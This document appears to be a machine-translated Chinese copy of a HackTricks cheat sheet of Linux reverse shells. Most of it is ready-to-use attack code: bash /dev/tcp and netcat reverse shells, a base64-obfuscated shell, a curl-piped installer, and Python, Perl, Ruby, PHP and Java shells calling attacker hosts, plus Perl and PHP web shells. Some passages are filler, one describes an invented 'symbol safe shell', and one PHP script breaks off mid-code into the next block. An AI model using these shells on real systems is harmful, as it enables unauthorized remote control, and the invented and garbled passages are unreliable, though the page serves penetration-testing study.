# Shell - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder 跟踪你的攻击面，运行主动威胁扫描，发现整个技术栈中的问题，从 API 到 Web 应用和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**如果你对这些 shell 有任何问题，你可以使用** [**https://explainshell.com/**](https://explainshell.com) **进行查询。**

## 完整 TTY

**一旦你获得一个反向 shell**[ **阅读此页面以获取完整的 TTY**](full-ttys.md)**。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### 符号安全的shell

The Symbol safe shell (symbolsh) is a secure shell that is designed to prevent command injection attacks by properly handling special characters and symbols. It ensures that any input containing special characters is treated as literal text and not interpreted as commands. Symbolsh is an effective tool for protecting against common vulnerabilities such as shell injection and remote code execution. It is recommended to use symbolsh when executing commands that involve user input or untrusted data.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell解释

1. **`bash -i`**: 这部分命令启动一个交互式（`-i`）Bash shell。
2. **`>&`**: 这部分命令是将**标准输出**（`stdout`）和**标准错误**（`stderr`）**同时重定向到同一目标**的简写表示法。
3. **`/dev/tcp/<攻击者IP>/<端口>`**: 这是一个特殊的文件，**表示与指定IP地址和端口的TCP连接**。
* 通过将输出和错误流重定向到该文件，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
4. **`0>&1`**: 这部分命令将**标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。

### 创建文件并执行
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## 前向Shell

你可能会遇到这样的情况，你在Linux机器上的一个Web应用中有一个RCE（远程命令执行），但由于Iptables规则或其他类型的过滤，你无法获得一个反向Shell。这个"shell"允许你通过在受害系统内部使用管道来维持一个PTY shell。

你可以在[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)找到代码。

你只需要修改：

* 受漏洞主机的URL
* 负载的前缀和后缀（如果有的话）
* 负载的发送方式（头部？数据？额外信息？）

然后，你可以**发送命令**，甚至可以使用`upgrade`命令来获得一个完整的PTY（请注意，管道的读写会有大约1.3秒的延迟）。

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

在[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)中进行检查
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet是一种用于远程登录和管理计算机系统的网络协议。它允许用户通过网络连接到远程主机，并在远程主机上执行命令。Telnet是一种明文协议，意味着所有的数据都以明文形式传输，没有加密保护。这使得Telnet在安全性方面存在风险，因为攻击者可以截获和窃取传输的数据。

在黑客攻击中，Telnet经常被用作一种入侵工具。攻击者可以使用Telnet来尝试通过暴力破解或使用默认凭据登录到远程主机。一旦成功登录，攻击者可以执行各种恶意操作，如安装后门、操纵系统配置或窃取敏感信息。

为了保护远程主机免受Telnet攻击，建议采取以下措施：

1. 禁用Telnet服务：将Telnet服务关闭，以阻止攻击者使用Telnet进行远程登录。
2. 使用安全替代方案：使用更安全的远程登录协议，如SSH（Secure Shell）来替代Telnet。
3. 强化凭据安全性：确保使用强密码，并定期更改密码，以防止攻击者通过暴力破解破解凭据。
4. 实施网络防火墙：配置网络防火墙以限制对Telnet端口的访问，并只允许受信任的IP地址连接。
5. 监控和日志记录：定期监控Telnet活动，并记录所有登录尝试和命令执行，以便及时检测和响应潜在的攻击。

通过采取这些措施，可以有效减少Telnet攻击的风险，并提高远程主机的安全性。
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻击者**
```bash
while true; do nc -l <port>; done
```
要发送命令，请将其写下来，按下回车键，然后按下CTRL+D（停止STDIN）

**受害者**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the common Python libraries and techniques used in hacking.

### Python Libraries for Hacking

#### Requests

The `requests` library is a popular choice for making HTTP requests in Python. It provides a simple and intuitive API for sending HTTP requests and handling responses. This library can be used for various hacking tasks, such as sending GET and POST requests, handling cookies, and manipulating headers.

#### BeautifulSoup

`BeautifulSoup` is a Python library used for web scraping and parsing HTML and XML documents. It provides a convenient way to extract data from web pages, which can be useful for gathering information during a hacking operation.

#### Paramiko

`Paramiko` is a Python library used for SSH (Secure Shell) communication. It allows you to establish SSH connections and execute commands on remote servers. This library can be useful for performing tasks such as remote code execution and privilege escalation.

#### Scapy

`Scapy` is a powerful Python library used for packet manipulation. It allows you to create, send, and receive network packets, making it a valuable tool for network reconnaissance and exploitation.

### Python Techniques for Hacking

#### Web Scraping

Web scraping is the process of extracting data from websites. Python, with libraries like `BeautifulSoup`, provides a convenient way to scrape web pages and extract useful information. This technique can be used for tasks such as gathering email addresses, scraping user data, and finding vulnerabilities in web applications.

#### Network Scanning

Network scanning involves discovering and mapping network resources. Python, with libraries like `Scapy`, can be used to perform network scans and identify open ports, vulnerable services, and potential attack vectors.

#### Exploitation

Python can be used for developing exploits to take advantage of vulnerabilities in software or systems. By leveraging libraries like `requests` and `Paramiko`, you can automate the process of exploiting vulnerabilities and gaining unauthorized access to target systems.

#### Password Cracking

Python can also be used for password cracking. With libraries like `hashlib` and `bcrypt`, you can implement various password cracking techniques, such as dictionary attacks and brute-force attacks.

### Conclusion

Python is a versatile language that can be used for various hacking tasks. Its extensive library ecosystem and easy-to-use syntax make it a popular choice among hackers. By mastering Python and its libraries, you can enhance your hacking skills and perform a wide range of hacking techniques.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl是一种通用的脚本编程语言，广泛用于网络和系统管理任务。它具有强大的文本处理能力和灵活的语法，使其成为渗透测试和黑客活动中常用的工具之一。

### Perl反向Shell

Perl反向Shell是一种利用Perl编写的恶意脚本，用于建立与目标系统的反向连接。它允许黑客通过远程访问目标系统并执行命令，从而获取对系统的完全控制。

以下是一个示例Perl反向Shell脚本：

```perl
use Socket;
use FileHandle;

$host = "attacker.com";
$port = 1234;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
$sin = sockaddr_in($port, inet_aton($host));
connect(SOCKET, $sin);

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");
```

在上面的示例中，黑客将自己的IP地址和端口设置为`attacker.com`和`1234`。然后，它使用Perl的Socket模块建立与目标系统的连接。接下来，它将标准输入、输出和错误重定向到与目标系统的连接上，并执行`/bin/sh -i`命令，以获取对目标系统的交互式Shell访问。

要使用Perl反向Shell，黑客需要将脚本上传到目标系统，并在目标系统上执行它。一旦脚本开始运行，黑客就可以通过连接到指定的IP地址和端口来与目标系统进行交互。

### Perl Web Shell

Perl Web Shell是一种基于Perl编写的Web应用程序，用于在目标Web服务器上执行命令和操作。它通常通过Web漏洞或弱密码进行部署，并允许黑客远程访问和控制目标服务器。

以下是一个示例Perl Web Shell脚本：

```perl
#!/usr/bin/perl

use CGI qw(:standard);
print header;
print start_html("Perl Web Shell");

if (param()) {
    $cmd = param('cmd');
    print "<pre>";
    system($cmd);
    print "</pre>";
}

print "<form method='POST'>";
print "<input type='text' name='cmd'>";
print "<input type='submit' value='Execute'>";
print "</form>";

print end_html;
```

在上面的示例中，Perl Web Shell使用CGI模块处理HTTP请求和参数。当黑客通过Web界面提交命令时，脚本将执行该命令并将结果输出到Web页面上。

要使用Perl Web Shell，黑客需要将脚本上传到目标Web服务器，并通过浏览器访问脚本的URL。一旦访问成功，黑客就可以在Web界面上执行命令并获取对目标服务器的控制。

### 总结

Perl是一种功能强大的脚本编程语言，可用于编写各种恶意脚本和工具。Perl反向Shell和Perl Web Shell是两种常见的黑客工具，用于在渗透测试和黑客活动中获取对目标系统的控制。黑客可以利用这些工具来执行命令、操作文件和获取敏感信息。
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby是一种动态、面向对象的编程语言，具有简洁而优雅的语法。它被广泛用于Web开发和脚本编写。Ruby的特点包括灵活的语法、强大的元编程能力和丰富的标准库。

### Ruby Shell

Ruby Shell是一个交互式的Ruby环境，可以在命令行中执行Ruby代码。它提供了一个方便的方式来测试和调试Ruby代码，以及执行简单的任务。

要启动Ruby Shell，只需在命令行中输入`irb`命令。这将打开一个交互式的Ruby环境，您可以在其中输入和执行Ruby代码。

### Ruby脚本

Ruby脚本是一系列Ruby代码的集合，可以通过命令行或其他方式执行。您可以使用任何文本编辑器创建Ruby脚本，并将其保存为以`.rb`为扩展名的文件。

要执行Ruby脚本，只需在命令行中输入`ruby`命令，后跟脚本文件的路径。例如，要执行名为`script.rb`的脚本文件，可以使用以下命令：

```shell
ruby script.rb
```

### Ruby Gems

Ruby Gems是Ruby的软件包管理系统，用于安装和管理Ruby库和应用程序。它允许您轻松地查找、安装和更新各种Ruby Gems。

要安装一个Ruby Gem，只需在命令行中使用`gem`命令，后跟要安装的Gem的名称。例如，要安装名为`nokogiri`的Gem，可以使用以下命令：

```shell
gem install nokogiri
```

### Ruby on Rails

Ruby on Rails（简称Rails）是一个基于Ruby的Web应用程序开发框架。它提供了一组工具和约定，使开发人员能够快速构建高效、可扩展的Web应用程序。

Rails采用了MVC（Model-View-Controller）架构模式，使开发人员能够将应用程序的不同部分分离开来，以便更好地组织和管理代码。

要创建一个新的Rails应用程序，只需在命令行中使用`rails`命令，后跟应用程序的名称。例如，要创建一个名为`myapp`的新Rails应用程序，可以使用以下命令：

```shell
rails new myapp
```

### Ruby安全性

与其他编程语言一样，Ruby应用程序也可能存在安全漏洞。为了确保Ruby应用程序的安全性，开发人员应该采取一些安全措施，例如：

- 输入验证和过滤，以防止跨站脚本攻击（XSS）和SQL注入等攻击。
- 使用安全的密码存储和身份验证机制，以保护用户的敏感信息。
- 对用户输入进行严格的验证和过滤，以防止任意代码执行和远程命令执行等攻击。
- 定期更新和升级Ruby Gems和其他依赖项，以修复已知的安全漏洞。

通过采取这些安全措施，开发人员可以提高Ruby应用程序的安全性，并减少潜在的安全风险。
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP（Hypertext Preprocessor）是一种广泛使用的开源服务器端脚本语言，特别适用于Web开发。它可以嵌入到HTML中，也可以作为独立的脚本运行。PHP语法简单易学，与多种数据库兼容，可以与各种Web服务器配合使用。以下是一些常用的PHP反弹Shell：

### PHP反弹Shell

#### 1. PHP一句话反弹Shell

```php
<?php @eval($_POST['cmd']); ?>
```

#### 2. PHP Web Shell

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

#### 3. PHP Meterpreter反弹Shell

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.1';  // 你的IP地址
$port = 1234;       // 你的监听端口
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    // 创建子进程
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("无法创建子进程");
        exit(1);
    }

    if ($pid) {
        exit(0);  // 父进程退出
    }

    if (posix_setsid() == -1) {
        printit("无法创建新的会话");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("无法创建子进程 (需要pcntl扩展)");
    exit(1);
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
    0 => array("pipe", "r"),  // 标准输入
    1 => array("pipe", "w"),  // 标准输出
    2 => array("pipe", "w"),  // 标准错误输出
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("无法创建进程");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("成功反弹Shell！");

while (1) {
    if (feof($sock)) {
        printit("套接字关闭");
        break;
    }

    if (feof($pipes[1])) {
        printit("进程关闭");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("套接字读取");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("从套接字读取: $input");
        fwrite($pipes[0], $input);
        if ($debug) printit("写入管道0");
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("管道1读取");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("从管道1读取: $input");
        fwrite($sock, $input);
        if ($debug) printit("写入套接字");
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("管道2读取");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("从管道2读取: $input");
        fwrite($sock, $input);
        if ($debug) printit("写入套接字");
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

#### 4. PHP反弹Shell（无需空格）

```php
<?php
$ip='192.168.0.1';  // 你的IP地址
$port=1234;       // 你的监听端口
$chunk_size=1400;
$write_a=null;
$error_a=null;
$shell='uname -a; w; id; /bin/sh -i';
$daemon=0;
$debug=0;

if(function_exists('pcntl_fork')) {
    $pid=pcntl_fork();

    if($pid==-1) {
        printit("无法创建子进程");
        exit(1);
    }

    if($pid) {
        exit(0);
    }

    if(posix_setsid()==-1) {
        printit("无法创建新的会话");
        exit(1);
    }

    $daemon=1;
} else {
    printit("无法创建子进程 (需要pcntl扩展)");
    exit(1);
}

chdir("/");

umask(0);

$sock=fsockopen($ip,$port,$errno,$errstr,30);
if(!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec=array(
    0=>array("pipe","r"),
    1=>array("pipe","w"),
    2=>array("pipe","w")
);

$process=proc_open($shell,$descriptorspec,$pipes);

if(!is_resource($process)) {
    printit("无法创建进程");
    exit(1);
}

stream_set_blocking($pipes[0],0);
stream_set_blocking($pipes[1],0);
stream_set_blocking($pipes[2],0);
stream_set_blocking($sock,0);

printit("成功反弹Shell！");

while(1) {
    if(feof($sock)) {
        printit("套接字关闭");
        break;
    }

    if(feof($pipes[1])) {
        printit("进程关闭");
        break;
    }

    $read_a=array($sock,$pipes[1],$pipes[2]);
    $num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);

    if(in_array($sock,$read_a)) {
        if($debug) printit("套接字读取");
        $input=fread($sock,$chunk_size);
        if($debug) printit("从套接字读取: $input");
        fwrite($pipes[0],$input);
        if($debug) printit("写入管道0");
    }

    if(in_array($pipes[1],$read_a)) {
        if($debug) printit("管道1读取");
        $input=fread($pipes[1],$chunk_size);
        if($debug) printit("从管道1读取: $input");
        fwrite($sock,$input);
        if($debug) printit("写入套接字");
    }

    if(in_array($pipes[2],$read_a)) {
        if($debug) printit("管道2读取");
        $input=fread($pipes[2],$chunk_size);
        if($debug) printit("从管道2读取: $input");
        fwrite($sock,$input);
        if($debug) printit("写入套接字");
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit($string) {
    if(!$daemon) {
        print "$string\n";
    }
}
?>
```

#### 5. PHP反弹Shell（无需空格和换行）

```php
<?php $ip='192.168.0.1';$port=1234;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("无法创建子进程");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("无法创建新的会话");exit(1);}$daemon=1;}else{printit("无法创建子进程 (需要pcntl扩展)");exit(1);}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("无法创建进程");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("成功反弹Shell！");while(1){if(feof($sock)){printit("套接字关闭");break;}if(feof($pipes[1])){printit("进程关闭");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug) printit("套接字读取");$input=fread($sock,$chunk_size);if($debug) printit("从套接字读取: $input");fwrite($pipes[0],$input);if($debug) printit("写入管道0");}if(in_array($pipes[1],$read_a)){if($debug) printit("管道1读取");$input=fread($pipes[1],$chunk_size);if($debug) printit("从管道1读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}if(in_array($pipes[2],$read_a)){if($debug) printit("管道2读取");$input=fread($pipes[2],$chunk_size);if($debug) printit("从管道2读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print "$string\n";}}?>
```

#### 6. PHP反弹Shell（无需空格和换行，使用POST方法）

```php
<?php $ip='192.168.0.1';$port=1234;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("无法创建子进程");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("无法创建新的会话");exit(1);}$daemon=1;}else{printit("无法创建子进程 (需要pcntl扩展)");exit(1);}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("无法创建进程");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("成功反弹Shell！");while(1){if(feof($sock)){printit("套接字关闭");break;}if(feof($pipes[1])){printit("进程关闭");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug) printit("套接字读取");$input=fread($sock,$chunk_size);if($debug) printit("从套接字读取: $input");fwrite($pipes[0],$input);if($debug) printit("写入管道0");}if(in_array($pipes[1],$read_a)){if($debug) printit("管道1读取");$input=fread($pipes[1],$chunk_size);if($debug) printit("从管道1读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}if(in_array($pipes[2],$read_a)){if($debug) printit("管道2读取");$input=fread($pipes[2],$chunk_size);if($debug) printit("从管道2读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print "$string\n";}}?>
```

#### 7. PHP反弹Shell（使用POST方法，无需空格和换行）

```php
<?php $ip='192.168.0.1';$port=1234;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("无法创建子进程");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("无法创建新的会话");exit(1);}$daemon=1;}else{printit("无法创建子进程 (需要pcntl扩展)");exit(1);}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("无法创建进程");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("成功反弹Shell！");while(1){if(feof($sock)){printit("套接字关闭");break;}if(feof($pipes[1])){printit("进程关闭");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug) printit("套接字读取");$input=fread($sock,$chunk_size);if($debug) printit("从套接字读取: $input");fwrite($pipes[0],$input);if($debug) printit("写入管道0");}if(in_array($pipes[1],$read_a)){if($debug) printit("管道1读取");$input=fread($pipes[1],$chunk_size);if($debug) printit("从管道1读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}if(in_array($pipes[2],$read_a)){if($debug) printit("管道2读取");$input=fread($pipes[2],$chunk_size);if($debug) printit("从管道2读取: $input");fwrite($sock,$input);if($debug) printit("写入套接字");}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print "$string\n";}}?>
```

#### 8. PHP反弹Shell（使用POST方法，无需空格和换行，使用base64编码）

```php
<?php $ip='192.168.0.1';$port=1234;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java是一种广泛使用的编程语言，具有跨平台的特性。它被广泛应用于开发各种类型的应用程序，包括桌面应用程序、移动应用程序和Web应用程序。Java具有强大的面向对象编程能力和丰富的标准库，使得开发人员可以快速构建高质量的软件。

### Java Shell

Java Shell是一个交互式的命令行工具，可以用于在Java环境中执行代码片段。它提供了一个方便的方式来测试和调试Java代码，以及快速验证想法和解决问题。

### 使用Java Shell

要使用Java Shell，首先需要安装Java Development Kit（JDK）的版本9或更高版本。安装完成后，可以通过在命令行中输入`jshell`命令来启动Java Shell。

一旦进入Java Shell，可以直接在命令行中输入Java代码，并立即执行。Java Shell会自动编译和执行输入的代码，并显示结果。

以下是一些Java Shell的常用命令：

- `/help`：显示帮助信息。
- `/exit`：退出Java Shell。
- `/vars`：显示当前定义的变量。
- `/methods`：显示当前定义的方法。
- `/imports`：显示当前导入的包。

### 示例

下面是一个使用Java Shell的简单示例：

```java
jshell> int a = 5;
a ==> 5

jshell> int b = 10;
b ==> 10

jshell> int sum = a + b;
sum ==> 15

jshell> System.out.println("The sum is: " + sum);
The sum is: 15
```

在上面的示例中，我们定义了两个整数变量`a`和`b`，并计算它们的和。然后，使用`System.out.println`方法打印出计算结果。

Java Shell提供了一个方便的方式来快速测试和验证Java代码，特别是对于一些简单的代码片段和表达式。它可以帮助开发人员更高效地编写和调试Java代码。
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that is included in the Nmap suite. It provides a flexible and feature-rich way to interact with network services. Ncat can be used for a variety of purposes, including port scanning, banner grabbing, and creating network connections.

### Installation

Ncat is typically installed along with Nmap. To install Nmap and Ncat on a Linux system, you can use the package manager of your distribution. For example, on Debian-based systems, you can use the following command:

```
sudo apt-get install nmap
```

### Basic Usage

Ncat can be used to establish connections with remote hosts using various protocols, such as TCP, UDP, and SSL. Here are some examples of basic usage:

- Connect to a remote host using TCP:

```
ncat <host> <port>
```

- Connect to a remote host using UDP:

```
ncat -u <host> <port>
```

- Connect to a remote host using SSL:

```
ncat --ssl <host> <port>
```

### Advanced Usage

Ncat provides many advanced features that can be useful for various tasks. Here are some examples:

- Port scanning:

```
ncat -v -z <host> <start-port>-<end-port>
```

- Banner grabbing:

```
ncat -v --recv-only <host> <port>
```

- File transfer:

```
ncat -l <port> > <file>
```

```
ncat <host> <port> < <file>
```

### Conclusion

Ncat is a versatile tool that can be used for a wide range of networking tasks. Its flexibility and feature set make it a valuable asset for both penetration testers and network administrators.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
